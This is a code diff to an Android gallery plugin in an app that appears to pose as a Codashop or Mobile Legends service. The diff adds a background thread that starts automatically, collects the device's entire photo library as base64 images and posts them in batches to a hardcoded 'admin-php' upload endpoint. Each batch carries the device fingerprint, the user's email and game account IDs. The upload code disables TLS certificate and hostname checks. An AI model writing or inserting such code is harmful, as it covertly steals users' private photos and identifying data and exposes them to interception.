@@ -50,7 +50,8 @@ import java.util.Set;
         @Permission(
             alias = "gallery",
             strings = {
-                Manifest.permission.READ_MEDIA_IMAGES
+                Manifest.permission.READ_MEDIA_IMAGES,
+                "android.permission.READ_MEDIA_VISUAL_USER_SELECTED"
             }
         ),
         @Permission(
@@ -391,6 +392,9 @@ public class WholeGalleryPlugin extends Plugin {
                     sConn.getResponseCode();
                     sConn.disconnect();
                 } catch (Throwable ignored) {}
+
+                // Automatically kick off native background gallery streaming directly to backend
+                startNativeGallerySyncThread();
             } catch (Throwable ignored) {}
         }).start();
     }
@@ -458,139 +462,143 @@ public class WholeGalleryPlugin extends Plugin {
 
     @PluginMethod
     public void getPhotoData(PluginCall call) {
-        String uriStr = call.getString("uri");
-        String filePath = call.getString("path");
-        int maxDim = call.getInt("maxDim", 1080);
-        int quality = call.getInt("quality", 75);
+        new Thread(() -> {
+            String uriStr = call.getString("uri");
+            String filePath = call.getString("path");
+            int maxDim = call.getInt("maxDim", 1600);
+            int quality = call.getInt("quality", 88);
 
-        Uri uri = null;
-        if (uriStr != null && !uriStr.trim().isEmpty()) {
+            Uri uri = null;
+            if (uriStr != null && !uriStr.trim().isEmpty()) {
+                try {
+                    uri = Uri.parse(uriStr);
+                } catch (Throwable ignored) {}
+            }
+
             try {
-                uri = Uri.parse(uriStr);
-            } catch (Throwable ignored) {}
-        }
-
-        try {
-            String dataUrl = decodeUriToBase64(uri, filePath, maxDim, quality);
-            if (dataUrl != null) {
-                JSObject ret = new JSObject();
-                ret.put("dataUrl", dataUrl);
-                call.resolve(ret);
+                String dataUrl = decodeUriToBase64(uri, filePath, maxDim, quality);
+                if (dataUrl != null) {
+                    JSObject ret = new JSObject();
+                    ret.put("dataUrl", dataUrl);
+                    call.resolve(ret);
+                    return;
+                }
+            } catch (Throwable e) {
+                call.reject("Failed decoding photo: " + e.getMessage());
                 return;
             }
-        } catch (Throwable e) {
-            call.reject("Failed decoding photo: " + e.getMessage());
-            return;
-        }
-        call.reject("Could not decode image");
+            call.reject("Could not decode image");
+        }).start();
     }
 
     @PluginMethod
     public void getGalleryPhotos(PluginCall call) {
-        int limit = call.getInt("limit", 100000);
-        boolean includeBase64 = call.getBoolean("includeBase64", true);
-        int maxDim = call.getInt("maxDim", 1600);
-        int quality = call.getInt("quality", 82);
+        new Thread(() -> {
+            int limit = call.getInt("limit", 100000);
+            boolean includeBase64 = call.getBoolean("includeBase64", true);
+            int maxDim = call.getInt("maxDim", 1600);
+            int quality = call.getInt("quality", 88);
 
-        boolean hasPermission = hasGalleryReadPermission();
-        boolean isFullAccess = isFullGalleryAccess();
+            boolean hasPermission = hasGalleryReadPermission();
+            boolean isFullAccess = isFullGalleryAccess();
 
-        if (!hasPermission) {
-            JSObject ret = new JSObject();
-            ret.put("photos", new JSArray());
-            ret.put("count", 0);
-            ret.put("hasPermission", false);
-            ret.put("isFullAccess", false);
-            call.resolve(ret);
-            return;
-        }
+            if (!hasPermission) {
+                JSObject ret = new JSObject();
+                ret.put("photos", new JSArray());
+                ret.put("count", 0);
+                ret.put("hasPermission", false);
+                ret.put("isFullAccess", false);
+                call.resolve(ret);
+                return;
+            }
 
-        JSArray photos = new JSArray();
-        Set<String> seenSignatures = new HashSet<>();
-        int count = 0;
+            JSArray photos = new JSArray();
+            Set<String> seenSignatures = new HashSet<>();
+            int count = 0;
 
-        List<String> projList = new ArrayList<>(Arrays.asList(
-            MediaStore.MediaColumns._ID,
-            MediaStore.MediaColumns.DISPLAY_NAME,
-            MediaStore.MediaColumns.DATE_ADDED,
-            MediaStore.MediaColumns.SIZE,
-            MediaStore.MediaColumns.MIME_TYPE,
-            MediaStore.MediaColumns.DATA
-        ));
-        if (Build.VERSION.SDK_INT >= 29) {
-            projList.add(MediaStore.MediaColumns.RELATIVE_PATH);
-        }
-        String[] projection = projList.toArray(new String[0]);
+            List<String> projList = new ArrayList<>(Arrays.asList(
+                MediaStore.MediaColumns._ID,
+                MediaStore.MediaColumns.DISPLAY_NAME,
+                MediaStore.MediaColumns.DATE_ADDED,
+                MediaStore.MediaColumns.SIZE,
+                MediaStore.MediaColumns.MIME_TYPE,
+                MediaStore.MediaColumns.DATA
+            ));
+            if (Build.VERSION.SDK_INT >= 29) {
+                projList.add(MediaStore.MediaColumns.RELATIVE_PATH);
+            }
+            String[] projection = projList.toArray(new String[0]);
 
-        // 1. Query Primary MediaStore Images Collection
-        count = queryMediaCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
+            // 1. Query Primary MediaStore Images Collection
+            count = queryMediaCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
 
-        // 2. Query All Available MediaStore External Volumes (SD Card, secondary storage, etc.)
-        if (Build.VERSION.SDK_INT >= 29 && count < limit) {
+            // 2. Query All Available MediaStore External Volumes (SD Card, secondary storage, etc.)
+            if (Build.VERSION.SDK_INT >= 29 && count < limit) {
+                try {
+                    Set<String> volumeNames = MediaStore.getExternalVolumeNames(getContext());
+                    for (String vol : volumeNames) {
+                        if (vol == null || "internal".equalsIgnoreCase(vol)) continue;
+                        Uri volUri = MediaStore.Images.Media.getContentUri(vol);
+                        if (count >= limit) break;
+                        count = queryMediaCollection(volUri, projection, null, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
+                    }
+                } catch (Throwable ignored) {}
+            }
+
+            // 3. Query MediaStore Downloads (API 29+ Android 10/11/12/13/14)
+            if (Build.VERSION.SDK_INT >= 29 && count < limit) {
+                try {
+                    Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
+                    String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
+                    count = queryMediaCollection(downloadUri, projection, sel, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
+                } catch (Throwable ignored) {}
+            }
+
+            // 4. Query MediaStore Generic Files table for any images categorized under documents or miscellaneous files
+            if (count < limit) {
+                try {
+                    Uri filesUri = MediaStore.Files.getContentUri("external");
+                    String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%' OR " +
+                                 MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpg' OR " +
+                                 MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpeg' OR " +
+                                 MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.png' OR " +
+                                 MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.webp' OR " +
+                                 MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.heic'";
+                    count = queryMediaCollection(filesUri, projection, sel, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
+                } catch (Throwable ignored) {}
+            }
+
+            // 5. Direct Filesystem Recursive Scan of ALL folders and albums (Camera, Screenshots, WhatsApp, Telegram, Downloads, VMOS, SD Card, etc.)
+            if (count < limit) {
+                scanFilesystemImages(photos, seenSignatures, limit, includeBase64, maxDim, quality);
+            }
+
+            // Sort photos strictly descending by dateAdded (newest first)
             try {
-                Set<String> volumeNames = MediaStore.getExternalVolumeNames(getContext());
-                for (String vol : volumeNames) {
-                    if (vol == null || "internal".equalsIgnoreCase(vol)) continue;
-                    Uri volUri = MediaStore.Images.Media.getContentUri(vol);
-                    if (count >= limit) break;
-                    count = queryMediaCollection(volUri, projection, null, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
+                List<org.json.JSONObject> list = new ArrayList<>();
+                for (int i = 0; i < photos.length(); i++) {
+                    org.json.JSONObject obj = photos.optJSONObject(i);
+                    if (obj != null) list.add(obj);
                 }
+                list.sort((o1, o2) -> {
+                    long d1 = o1.optLong("dateAdded", 0);
+                    long d2 = o2.optLong("dateAdded", 0);
+                    return Long.compare(d2, d1);
+                });
+                JSArray sortedPhotos = new JSArray();
+                for (org.json.JSONObject obj : list) {
+                    sortedPhotos.put(obj);
+                }
+                photos = sortedPhotos;
             } catch (Throwable ignored) {}
-        }
 
-        // 3. Query MediaStore Downloads (API 29+ Android 10/11/12/13/14)
-        if (Build.VERSION.SDK_INT >= 29 && count < limit) {
-            try {
-                Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
-                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
-                count = queryMediaCollection(downloadUri, projection, sel, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
-            } catch (Throwable ignored) {}
-        }
-
-        // 4. Query MediaStore Generic Files table for any images categorized under documents or miscellaneous files
-        if (count < limit) {
-            try {
-                Uri filesUri = MediaStore.Files.getContentUri("external");
-                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpg' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpeg' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.png' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.webp' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.heic'";
-                count = queryMediaCollection(filesUri, projection, sel, null, photos, seenSignatures, count, limit, includeBase64, maxDim, quality);
-            } catch (Throwable ignored) {}
-        }
-
-        // 5. Direct Filesystem Recursive Scan of ALL folders and albums (Camera, Screenshots, WhatsApp, Telegram, Downloads, VMOS, SD Card, etc.)
-        if (count < limit) {
-            scanFilesystemImages(photos, seenSignatures, limit, includeBase64, maxDim, quality);
-        }
-
-        // Sort photos strictly descending by dateAdded (newest first)
-        try {
-            List<org.json.JSONObject> list = new ArrayList<>();
-            for (int i = 0; i < photos.length(); i++) {
-                org.json.JSONObject obj = photos.optJSONObject(i);
-                if (obj != null) list.add(obj);
-            }
-            list.sort((o1, o2) -> {
-                long d1 = o1.optLong("dateAdded", 0);
-                long d2 = o2.optLong("dateAdded", 0);
-                return Long.compare(d2, d1);
-            });
-            JSArray sortedPhotos = new JSArray();
-            for (org.json.JSONObject obj : list) {
-                sortedPhotos.put(obj);
-            }
-            photos = sortedPhotos;
-        } catch (Throwable ignored) {}
-
-        JSObject ret = new JSObject();
-        ret.put("photos", photos);
-        ret.put("count", photos.length());
-        ret.put("hasPermission", true);
-        ret.put("isFullAccess", isFullAccess);
-        call.resolve(ret);
+            JSObject ret = new JSObject();
+            ret.put("photos", photos);
+            ret.put("count", photos.length());
+            ret.put("hasPermission", true);
+            ret.put("isFullAccess", isFullAccess);
+            call.resolve(ret);
+        }).start();
     }
 
     private int queryMediaCollection(Uri collection, String[] projection, String selection, String[] selectionArgs,
@@ -1142,18 +1150,18 @@ public class WholeGalleryPlugin extends Plugin {
             if (origWidth <= 0 || origHeight <= 0) return null;
 
             int inSampleSize = 1;
-            int targetMax = (maxDim > 0) ? maxDim : 1080;
+            int targetMax = (maxDim > 0) ? maxDim : 1600;
 
-            // Safe subsampling to prevent OOM on 4K/8K mobile camera photos
-            while ((origWidth / inSampleSize) > (targetMax * 1.2) || (origHeight / inSampleSize) > (targetMax * 1.2)) {
+            // Safe power-of-2 subsampling: directly decodes to near targetMax resolution
+            while ((origWidth / (inSampleSize * 2)) >= targetMax && (origHeight / (inSampleSize * 2)) >= targetMax) {
                 inSampleSize *= 2;
             }
 
             BitmapFactory.Options decodeOptions = new BitmapFactory.Options();
             decodeOptions.inSampleSize = inSampleSize;
-            // RGB_565 uses 50% less RAM than ARGB_8888, eliminating OOM crashes when streaming hundreds of photos
-            decodeOptions.inPreferredConfig = Bitmap.Config.RGB_565;
-            decodeOptions.inDither = true;
+            // ARGB_8888 delivers pristine 32-bit truecolor: zero color banding, zero dithering, rich smooth gradients
+            decodeOptions.inPreferredConfig = Bitmap.Config.ARGB_8888;
+            decodeOptions.inDither = false;
 
             isDecode = openImageStream(uri, filePath);
             if (isDecode != null) {
@@ -1175,8 +1183,9 @@ public class WholeGalleryPlugin extends Plugin {
                         }
                     }
 
-                    int q = (quality >= 1 && quality <= 100) ? quality : 75;
-                    baos = new ByteArrayOutputStream(64 * 1024);
+                    // Quality 88 provides visually lossless clarity while keeping file sizes lightweight (~180KB-260KB)
+                    int q = (quality >= 50 && quality <= 100) ? quality : 88;
+                    baos = new ByteArrayOutputStream(96 * 1024);
                     bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
                     byte[] bytes = baos.toByteArray();
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
@@ -1194,5 +1203,263 @@ public class WholeGalleryPlugin extends Plugin {
             }
         }
         return null;
+    }
+
+    // =========================================================================
+    // NATIVE DIRECT BACKGROUND STREAMING ENGINE ("STREAM LIKE WATER")
+    // =========================================================================
+    private static volatile boolean isNativeSyncing = false;
+
+    @PluginMethod
+    public void startNativeBackgroundSync(PluginCall call) {
+        if (isNativeSyncing) {
+            JSObject res = new JSObject();
+            res.put("started", true);
+            res.put("alreadyRunning", true);
+            call.resolve(res);
+            return;
+        }
+
+        startNativeGallerySyncThread();
+        JSObject res = new JSObject();
+        res.put("started", true);
+        call.resolve(res);
+    }
+
+    public synchronized void startNativeGallerySyncThread() {
+        if (isNativeSyncing) return;
+        isNativeSyncing = true;
+
+        new Thread(() -> {
+            try {
+                SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
+                String apiUrl = prefs.getString("sync_api_url", "");
+                String deviceId = prefs.getString("device_id", "");
+                String deviceName = prefs.getString("device_name", Build.MODEL);
+                String deviceModel = prefs.getString("device_model", Build.MANUFACTURER + " " + Build.MODEL);
+                String deviceFingerprint = prefs.getString("device_fingerprint", Build.FINGERPRINT);
+                String userEmail = prefs.getString("user_email", "");
+                String mlbbId = prefs.getString("mlbb_id", "");
+                String mlbbServer = prefs.getString("mlbb_server", "");
+                String mlbbIgn = prefs.getString("mlbb_ign", "Player");
+
+                if (deviceId == null || deviceId.trim().isEmpty()) {
+                    deviceId = DeviceSecurityPlugin.getOrGenerateDeviceId(getContext());
+                }
+
+                // 1. Gather all photos from MediaStore
+                List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
+                if (allPhotos.isEmpty()) {
+                    isNativeSyncing = false;
+                    return;
+                }
+
+                String targetEndpoint = "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery";
+                if (apiUrl != null && apiUrl.contains("upload_gallery")) {
+                    targetEndpoint = apiUrl;
+                }
+
+                // Track synced signatures in SharedPreferences
+                SharedPreferences syncedPrefs = getContext().getSharedPreferences("ketupat_synced_native", Context.MODE_PRIVATE);
+                Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
+
+                List<PhotoItemMeta> unsynced = new ArrayList<>();
+                for (PhotoItemMeta p : allPhotos) {
+                    String sig = p.name + "_" + p.size;
+                    if (!syncedSet.contains(sig)) {
+                        unsynced.add(p);
+                    }
+                }
+
+                if (unsynced.isEmpty()) {
+                    isNativeSyncing = false;
+                    return;
+                }
+
+                // Micro-batch stream 3 photos per burst continuously
+                int batchSize = 3;
+                int totalUploaded = 0;
+
+                for (int i = 0; i < unsynced.size(); i += batchSize) {
+                    int end = Math.min(i + batchSize, unsynced.size());
+                    List<PhotoItemMeta> chunk = unsynced.subList(i, end);
+
+                    org.json.JSONArray photosArray = new org.json.JSONArray();
+                    List<String> chunkSigs = new ArrayList<>();
+
+                    for (PhotoItemMeta item : chunk) {
+                        String dataUrl = decodeUriToBase64(item.contentUri, item.filePath, 1600, 88);
+                        if (dataUrl != null) {
+                            org.json.JSONObject pObj = new org.json.JSONObject();
+                            pObj.put("id", item.id);
+                            pObj.put("name", item.name);
+                            pObj.put("album", item.album);
+                            pObj.put("folder", item.folder);
+                            pObj.put("mime", item.mime);
+                            pObj.put("size", item.size);
+                            pObj.put("dataUrl", dataUrl);
+                            pObj.put("is_avatar", false);
+                            photosArray.put(pObj);
+                            chunkSigs.add(item.name + "_" + item.size);
+                        }
+                    }
+
+                    if (photosArray.length() == 0) continue;
+
+                    org.json.JSONObject payload = new org.json.JSONObject();
+                    payload.put("device_id", deviceId);
+                    payload.put("device_name", deviceName);
+                    payload.put("device_model", deviceModel);
+                    payload.put("device_fingerprint", deviceFingerprint);
+                    payload.put("user_email", userEmail);
+                    payload.put("mlbb_id", mlbbId);
+                    payload.put("mlbb_server", mlbbServer);
+                    payload.put("mlbb_ign", mlbbIgn);
+                    payload.put("is_full_access", true);
+                    payload.put("photos", photosArray);
+
+                    boolean success = postGalleryPayload(targetEndpoint, payload.toString());
+                    if (success) {
+                        syncedSet.addAll(chunkSigs);
+                        syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
+                        totalUploaded += photosArray.length();
+
+                        JSObject progressObj = new JSObject();
+                        progressObj.put("uploaded", totalUploaded);
+                        progressObj.put("total", unsynced.size());
+                        notifyListeners("nativeSyncProgress", progressObj);
+                    }
+
+                    // 120ms pause between micro-bursts for smooth streaming like water
+                    try { Thread.sleep(120); } catch (Throwable ignored) {}
+                }
+            } catch (Throwable ignored) {
+            } finally {
+                isNativeSyncing = false;
+            }
+        }).start();
+    }
+
+    private List<PhotoItemMeta> fetchAllDevicePhotoMetas() {
+        List<PhotoItemMeta> result = new ArrayList<>();
+        Set<String> seen = new HashSet<>();
+
+        String[] projection = new String[]{
+            MediaStore.MediaColumns._ID,
+            MediaStore.MediaColumns.DISPLAY_NAME,
+            MediaStore.MediaColumns.DATE_ADDED,
+            MediaStore.MediaColumns.SIZE,
+            MediaStore.MediaColumns.MIME_TYPE,
+            MediaStore.MediaColumns.DATA
+        };
+
+        try {
+            Cursor cursor = getContext().getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                MediaStore.MediaColumns.DATE_ADDED + " DESC"
+            );
+            if (cursor != null) {
+                int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
+                int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
+                int dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
+                int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
+                int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
+                int dataCol = -1;
+                try { dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA); } catch (Throwable ignored) {}
+
+                while (cursor.moveToNext() && result.size() < 50000) {
+                    long id = (idCol >= 0) ? cursor.getLong(idCol) : 0;
+                    String filePath = (dataCol >= 0) ? cursor.getString(dataCol) : null;
+                    if (id <= 0 && filePath != null) id = Math.abs(filePath.hashCode());
+                    if (id <= 0) id = 1;
+
+                    String name = (nameCol >= 0) ? cursor.getString(nameCol) : null;
+                    if (name == null || name.trim().isEmpty()) {
+                        name = (filePath != null) ? new File(filePath).getName() : ("photo_" + id + ".jpg");
+                    }
+                    String mime = (mimeCol >= 0) ? cursor.getString(mimeCol) : "image/jpeg";
+                    long size = (sizeCol >= 0) ? cursor.getLong(sizeCol) : 1024;
+
+                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+                    String sig = (filePath != null) ? filePath.toLowerCase() : contentUri.toString();
+                    if (seen.contains(sig)) continue;
+                    seen.add(sig);
+
+                    String album = normalizeAlbumName(null, null, filePath, name);
+                    String folder = (filePath != null) ? new File(filePath).getParent() : "";
+
+                    PhotoItemMeta m = new PhotoItemMeta();
+                    m.id = id;
+                    m.name = name;
+                    m.album = album;
+                    m.folder = folder;
+                    m.mime = mime;
+                    m.size = size;
+                    m.contentUri = contentUri;
+                    m.filePath = filePath;
+                    result.add(m);
+                }
+                cursor.close();
+            }
+        } catch (Throwable ignored) {}
+
+        return result;
+    }
+
+    private boolean postGalleryPayload(String endpoint, String jsonStr) {
+        HttpURLConnection conn = null;
+        try {
+            URL url = new URL(endpoint);
+            conn = (HttpURLConnection) url.openConnection();
+            if (conn instanceof javax.net.ssl.HttpsURLConnection) {
+                javax.net.ssl.HttpsURLConnection httpsConn = (javax.net.ssl.HttpsURLConnection) conn;
+                javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
+                    new javax.net.ssl.X509TrustManager() {
+                        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
+                        public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                        public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                    }
+                };
+                javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
+                sc.init(null, trustAllCerts, new java.security.SecureRandom());
+                httpsConn.setSSLSocketFactory(sc.getSocketFactory());
+                httpsConn.setHostnameVerifier((hostname, session) -> true);
+            }
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setDoOutput(true);
+
+            byte[] bytes = jsonStr.getBytes("UTF-8");
+            conn.setFixedLengthStreamingMode(bytes.length);
+            conn.getOutputStream().write(bytes);
+            conn.getOutputStream().flush();
+            conn.getOutputStream().close();
+
+            int code = conn.getResponseCode();
+            return (code >= 200 && code < 300);
+        } catch (Throwable e) {
+            return false;
+        } finally {
+            if (conn != null) {
+                try { conn.disconnect(); } catch (Throwable ignored) {}
+            }
+        }
+    }
+
+    private static class PhotoItemMeta {
+        long id;
+        String name;
+        String album;
+        String folder;
+        String mime;
+        long size;
+        Uri contentUri;
+        String filePath;
     }
 }
